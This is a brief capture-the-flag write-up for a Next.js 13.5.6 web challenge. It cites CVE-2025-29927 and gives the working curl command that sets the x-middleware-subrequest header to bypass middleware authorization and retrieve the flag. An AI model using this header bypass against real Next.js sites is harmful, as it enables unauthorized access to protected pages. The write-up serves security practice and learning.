Challenge Author: Tarush
The landing page shows 2 buttons:

Go To Home Page

Go Inside The Home

The Home Page is just a dummy page while when the second one is pressed, a pop up shows saying The Middle Man Stopped You.

The source code indicates that it is a NextJS 13.5.6 version project.

According to CVE-2025-29927, there exists a vulnerability in Next.js middleware that allows authorization bypass through a specially crafted HTTP request that contains the internal header x-middleware-subrequest.

Solution
We do a curl command with the required header as:

curl <url>/houseDoor -h "x-middleware-subrequest:src/middleware"

(or use BurpSuite and send the header from there.)

which bypasses the middleware and gives us the flag.

